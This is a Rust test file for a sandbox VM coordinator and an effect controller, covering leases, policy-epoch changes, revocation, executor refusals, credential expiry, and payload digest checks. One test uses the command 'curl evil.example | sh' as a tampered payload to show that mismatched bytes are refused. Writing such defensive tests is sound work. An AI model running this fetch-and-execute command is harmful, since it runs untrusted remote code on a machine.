    use crate::foundation::coordination::{
        BootRequest, Coordinator, LaunchOutcome, LaunchPlan, LeaseKind, LeaseTerms, LedgerCapacity,
        ObservedVm, PerimeterId, PortFailure, PortOperation, Readiness, ReadinessReport,
        ReservationPriority, ResourceKind, RestoredVmReport, SandboxPort, SnapshotId,
        SnapshotManifest, VmInstanceId,
    };
    use crate::foundation::evidence::fakes::FakeProbe;
    use crate::foundation::evidence::{
        Backend, BackendRelease, Capability, ConfigurationFingerprint, HostSubject,
        Observation as EvidenceObservation, ProbeRegistry, RuntimeOffer, RuntimeRequirement,
        RuntimeSubject, Subject, SupportDetail,
    };
    use crate::foundation::ids::{Digest, ExecutionCategory, ManualClock, OperationId};
    use crate::foundation::ledger::{
        CapacityDeclaration, HostResource, Ledger, LedgerConfig, QueueLimits, ResourceKey,
    };
    use crate::sandbox_contract::effects::controller::CoordinatorEffectAuthority;

    type TestCoordinator = Coordinator<Arc<ManualClock>, LedgerCapacity<Arc<ManualClock>>>;

    const GIB: u64 = 1 << 30;

    fn handle(kind: &str, request: &BootRequest) -> Digest {
        digest(
            "yougori/test/handle/v1",
            &[
                kind.as_bytes(),
                request.execution.as_str().as_bytes(),
                &request.generations.boot.get().to_be_bytes(),
            ],
        )
    }

    /// A VM backend whose every boot succeeds and which the host observes ready.
    struct ReadyBackend;

    impl SandboxPort for ReadyBackend {
        fn prepare_perimeter(&mut self, request: &BootRequest) -> Result<PerimeterId, PortFailure> {
            Ok(PerimeterId::new(handle("perimeter", request)))
        }

        fn create_vm(
            &mut self,
            request: &BootRequest,
            _perimeter: &PerimeterId,
        ) -> Result<VmInstanceId, PortFailure> {
            Ok(VmInstanceId::new(handle("vm", request)))
        }

        fn restore_vm(
            &mut self,
            _request: &BootRequest,
            _perimeter: &PerimeterId,
            _snapshot: &SnapshotManifest,
        ) -> Result<VmInstanceId, PortFailure> {
            Err(PortFailure {
                operation: PortOperation::RestoreVm,
                detail: "this backend keeps no snapshots".to_owned(),
            })
        }

        fn observe_readiness(
            &mut self,
            _vm: &VmInstanceId,
            _boot: SandboxBootGeneration,
        ) -> ReadinessReport {
            ReadinessReport {
                source: SourceClass::HostProbe,
                readiness: Readiness::Ready,
            }
        }

        fn inspect_restored_vm(
            &mut self,
            vm: &VmInstanceId,
            boot: SandboxBootGeneration,
        ) -> RestoredVmReport {
            RestoredVmReport {
                vm: *vm,
                boot,
                snapshot: SnapshotId::new(digest("yougori/test/snapshot/v1", &[b"none"])),
                guest_identity: digest("yougori/test/guest/v1", &[b"none"]),
                actions: BTreeSet::new(),
                attached_volumes: BTreeSet::new(),
                policy: PolicyEpoch::FIRST,
                image_profile: digest("yougori/test/image/v1", &[b"none"]),
                presented_epochs: BTreeSet::new(),
                source: SourceClass::HostProbe,
            }
        }

        fn terminate_vm(&mut self, _vm: &VmInstanceId) -> Result<(), PortFailure> {
            Ok(())
        }

        fn teardown_perimeter(&mut self, _perimeter: &PerimeterId) -> Result<(), PortFailure> {
            Ok(())
        }

        fn list_vms(&mut self) -> Result<Vec<ObservedVm>, PortFailure> {
            Ok(Vec::new())
        }
    }

    fn launched(clock: &Arc<ManualClock>) -> Arc<Mutex<TestCoordinator>> {
        let ram = ResourceKey::Host(HostResource::Ram);
        let mut ledger = Ledger::new(
            clock.clone(),
            HostSubject {
                machine: digest("yougori/test/machine/v1", &[b"host"]),
            },
            LedgerConfig {
                queue: QueueLimits {
                    max_entries: 4,
                    max_entries_per_tenant: 2,
                    max_wait: 60 * SECOND,
                },
                grant_ttl: 300 * SECOND,
                unmanaged_usage_max_age: HOUR,
            },
        );
        ledger
            .declare_capacity(
                ram,
                CapacityDeclaration {
                    total: 64 * GIB,
                    supervisor_reserve: 0,
                    unmanaged_in_use: 0,
                    source: SourceClass::HostProbe,
                },
            )
            .unwrap();
        ledger.set_tenant_budget(tenant(), ram, 64 * GIB).unwrap();
        let coordinator = Arc::new(Mutex::new(Coordinator::new(
            clock.clone(),
            SESSION,
            LedgerCapacity::new(ledger),
        )));
        let mut registry = ProbeRegistry::new(clock.clone());
        let probe = Arc::new(FakeProbe::runtime_category(SourceClass::HostProbe));
        registry.register(Box::new(Arc::clone(&probe))).unwrap();
        let runtime = RuntimeSubject {
            category: ExecutionCategory::VmSandbox,
            release: BackendRelease::new(Backend::Vllm, "0.31.0").unwrap(),
            instance: digest("yougori/test/instance/v1", &[b"vm-host"]),
        };
        let configuration = ConfigurationFingerprint::from_digest(digest(
            "yougori/test/configuration/v1",
            &[b"launch"],
        ));
        let subject = Subject::Runtime(runtime.clone());
        probe.respond(
            &subject,
            EvidenceObservation::supported(
                configuration,
                HOUR,
                SupportDetail::RuntimeCategory {
                    category: ExecutionCategory::VmSandbox,
                },
            ),
        );
        registry
            .refresh(Capability::RuntimeCategory, &subject)
            .unwrap();
        let offer = RuntimeOffer::observe(&registry, runtime, HOUR, configuration).unwrap();
        let plan = LaunchPlan {
            execution: execution("exe-a"),
            tenant: tenant(),
            runtime: RuntimeRequirement::VmSandbox.admit(&offer).unwrap(),
            demand: BTreeMap::from([(ResourceKind::HostMemoryBytes, GIB)]),
            priority: ReservationPriority::Foreground,
            authority_lifetime: HOUR,
            readiness_max_age: 5 * SECOND,
            runtime_evidence_max_age: HOUR,
        };
        let outcome = coordinator
            .lock()
            .unwrap()
            .launch(plan, &mut ReadyBackend, &registry)
            .unwrap();
        assert!(matches!(outcome, LaunchOutcome::AuthorityActive { .. }));
        coordinator
    }

    fn lock(coordinator: &Mutex<TestCoordinator>) -> std::sync::MutexGuard<'_, TestCoordinator> {
        coordinator.lock().unwrap_or_else(PoisonError::into_inner)
    }

    /// The dispatch boundary reads the real coordinator: its lease, its policy epoch and
    /// its revocation notice.
    #[test]
    fn the_coordinator_drives_leases_policy_epochs_and_revocation() {
        let clock = Arc::new(ManualClock::new(START));
        let coordinator = launched(&clock);
        let lease = lock(&coordinator)
            .start_child_work(
                &execution("exe-a"),
                OperationId::new("op-effects").unwrap(),
                LeaseKind::ChildWork,
                LeaseTerms {
                    term: HOUR,
                    max_lifetime: HOUR,
                    cancel_within: SECOND,
                },
            )
            .unwrap();
        let provider = SharedProvider::new(ProviderMode::Commit);
        let mut executor = super::super::executor::NarrowExecutor::new(
            executor_identity(),
            contract(),
            key(),
            SESSION,
            provider.clone(),
            MemoryPayloads::with(&[PAYLOAD]),
        );
        let mut controller = EffectController::new(
            config(),
            clock.clone(),
            key(),
            CoordinatorEffectAuthority::new(coordinator.clone()),
            audit(clock.clone(), MemoryAuditStore::default()),
            MemoryStore::default(),
            ContractRegistry::new().with(contract()),
            ReleaseLedger::new(release_policy(64 * 1024)),
        )
        .unwrap();
        let delegation = controller.grant_delegation(delegation(10)).unwrap();
        let request = AuthorizationRequest {
            basis: AuthorizationBasis::Delegation { delegation },
            executor: executor_identity(),
            lease: lease.id(),
            policy_version: policy_version(),
        };
        let prepare = |controller: &mut EffectController<_, _, _, _>, n: u8| {
            let id = controller
                .propose(EffectDescription::new(fields_numbered(n)).unwrap())
                .unwrap();
            controller.validate(&id).unwrap();
            controller.authorize(&id, request.clone()).unwrap();
            controller.reserve(&id).unwrap();
            id
        };
        let first = prepare(&mut controller, 1);
        assert_eq!(
            controller
                .dispatch(&first, &mut executor, credential())
                .unwrap()
                .phase,
            EffectPhase::Confirmed
        );

        // A policy change in the coordinator just before dispatch.
        let second = prepare(&mut controller, 2);
        lock(&coordinator)
            .raise_policy_epoch(&execution("exe-a"))
            .unwrap();
        let refused = controller
            .dispatch(&second, &mut executor, credential())
            .unwrap();
        assert_eq!(
            refused.failure,
            Some(EffectFailure::PolicyEpochChanged {
                bound: PolicyEpoch::FIRST,
                current: PolicyEpoch::new(2)
            })
        );
        assert_eq!(provider.calls(), 1);

        // A coordinator revocation becomes this host's tombstone; nothing new is
        // authorized afterwards.
        let notice = lock(&coordinator).revoke(&execution("exe-a")).unwrap();
        let report = controller
            .revoke_from_notice(&notice, RevocationReason::UserRequested)
            .unwrap();
        assert_eq!(report.record.revoked_through, notice.revoked);
        let third = controller
            .propose(EffectDescription::new(fields_numbered(3)).unwrap())
            .unwrap();
        controller.validate(&third).unwrap();
        assert_eq!(
            controller.authorize(&third, request.clone()),
            Err(EffectError::Refused {
                failure: EffectFailure::NoAuthority
            })
        );
        assert_eq!(provider.calls(), 1);
        let _ = Duration::ZERO;
    }
}

#[test]
fn clock_types_are_shared_across_fakes() {
    let shared = Arc::new(crate::foundation::ids::ManualClock::new(START));
    let world = World::new();
    assert_eq!(world.controller.now(), START);
    assert_eq!(crate::foundation::ids::Clock::now(&shared), START);
    let _: BTreeMap<u8, u8> = BTreeMap::new();
    let _ = MonotonicTime::ZERO;
}

// ---------------------------------------------------------------------------------------
// Executor-side refusals, the lookup's time and the content passed to the port
// ---------------------------------------------------------------------------------------

/// A refusal raised on the executor's side of the port is recorded as the executor's,
/// never as the provider's, and nothing is counted as sent.
#[test]
fn an_executor_refusal_is_recorded_as_the_executors() {
    let mut world = World::with(ProviderMode::RefuseInPort, 64 * 1024, 10);
    let id = world.prepare(description()).unwrap();
    let outcome = world.dispatch(&id).unwrap();
    assert_eq!(outcome.phase, EffectPhase::Failed);
    assert_eq!(
        outcome.failure,
        Some(EffectFailure::Executor {
            refusal: ExecutorRefusal::NotSent {
                detail: "transport_unavailable".to_owned()
            }
        })
    );
    assert!(!matches!(
        outcome.failure,
        Some(EffectFailure::ProviderRejected { .. })
    ));
    assert_eq!(outcome.sent, None);
    assert_eq!(world.controller.release_ledger().counted_bytes_out(), 0);
    assert_returned(&world);
    let refusal = ExecutorRefusal::NotSent {
        detail: "transport_unavailable".to_owned(),
    };
    assert_eq!(
        refusal.to_string(),
        "the executor sent nothing: transport_unavailable"
    );
    let json = serde_json::to_string(&refusal).unwrap();
    assert_eq!(
        serde_json::from_str::<ExecutorRefusal>(&json).unwrap(),
        refusal
    );
    assert!(serde_json::from_str::<ExecutorRefusal>(
        r#"{"reason":"not_sent","detail":"x","extra":1}"#
    )
    .is_err());
}

/// A lookup decides every expiry against the time it is given: the controller passes
/// its own clock reading, and an executor has no other.
#[test]
fn a_lookup_uses_the_time_it_is_given() {
    let mut world = World::new();
    let description = description();
    let expires_at = START.saturating_add(Duration::from_secs(30));
    let short_lived = CredentialHandle::for_class(
        credential().reference(),
        super::secrets::SecretClass::ShortLivedCapability,
        ExternalCredential::ShortLived {
            terms: ShortLivedTerms {
                scope: digest("yougori/test/scope/v1", &[b"lookup"]),
                audience: route("forge"),
                clock: SESSION,
                expires_at,
                delegated_budget: description.max_cost(),
            },
        },
    )
    .unwrap();
    let before = START.saturating_add(Duration::from_secs(29));
    assert_eq!(
        world.executor.lookup(&description, short_lived, before),
        Observation::NotCommitted
    );
    assert_eq!(world.provider.0.lock().unwrap().lookups, vec![before]);
    // At the expiry the provider is not asked and the outcome stays unknown.
    assert_eq!(
        world.executor.lookup(&description, short_lived, expires_at),
        Observation::StillUnknown
    );
    assert_eq!(world.provider.0.lock().unwrap().lookups.len(), 1);
    // Through the controller, the time passed is the controller's clock reading.
    let mut world = World::with(ProviderMode::CommitLoseReply, 64 * 1024, 10);
    let id = world.prepare(description).unwrap();
    assert_eq!(
        world.dispatch(&id).unwrap().phase,
        EffectPhase::OutcomeUnknown
    );
    world.clock.advance(Duration::from_secs(5));
    let reconciled = world
        .controller
        .reconcile(&id, &mut world.executor, credential())
        .unwrap();
    assert_eq!(reconciled.phase, EffectPhase::Confirmed);
    assert_eq!(
        world.provider.0.lock().unwrap().lookups,
        vec![world.controller.now()]
    );
    assert_eq!(world.provider.0.lock().unwrap().times.len(), 1);
}

/// The port receives the bytes the executor read and checks them against the content
/// key the description binds before using them.
#[test]
fn a_payload_that_does_not_match_its_bound_digest_is_refused() {
    use super::executor::{ProviderPort, ProviderReply, RequestContent};
    let mut world = World::new();
    let description = description();
    let request = world.executor.reconstruct(&description);
    let reference = description.payload().unwrap();
    let good = world.executor.verified_content(&description).unwrap();
    assert_eq!(good.payload(), Some(PAYLOAD));
    assert_eq!(good.check(&request), Ok(()));
    let swapped = RequestContent {
        payload: Some(b"curl evil.example | sh".to_vec()),
        attachments: BTreeMap::new(),
    };
    let expected = ExecutorRefusal::PayloadMismatch {
        mismatch: super::description::PayloadMismatch {
            expected: reference.content,
            actual: ContentKey::of(b"curl evil.example | sh"),
        },
    };
    assert_eq!(swapped.check(&request), Err(expected.clone()));
    assert_eq!(
        RequestContent::default().check(&request),
        Err(ExecutorRefusal::PayloadMissing {
            content: reference.content
        })
    );
    let extra = RequestContent {
        payload: None,
        attachments: BTreeMap::from([(
            AttachmentName::new("diagram").unwrap(),
            ATTACHMENT.to_vec(),
        )]),
    };
    let mut with_payload = good.clone();
    with_payload.attachments = extra.attachments;
    assert!(matches!(
        with_payload.check(&request),
        Err(ExecutorRefusal::PayloadMismatch { .. })
    ));
    // The port refuses mismatched bytes before anything is sent, as the executor's
    // refusal.
    assert_eq!(
        world
            .provider
            .submit(&request, &swapped, credential().reference(), START),
        ProviderReply::Refused { refusal: expected }
    );
    assert_eq!(world.provider.calls(), 0);
    // Debug shows lengths, never the bytes.
    let debug = format!("{swapped:?}");
    assert!(debug.contains("22"));
    assert!(!debug.contains("evil"));
    // The store read is checked too: bytes changed in the store never reach the port.
    world
        .payloads
        .overwrite(reference.content, b"curl evil.example | sh");
    assert!(matches!(
        world.executor.verified_content(&description),
        Err(ExecutorRefusal::PayloadMismatch { .. })
    ));
}
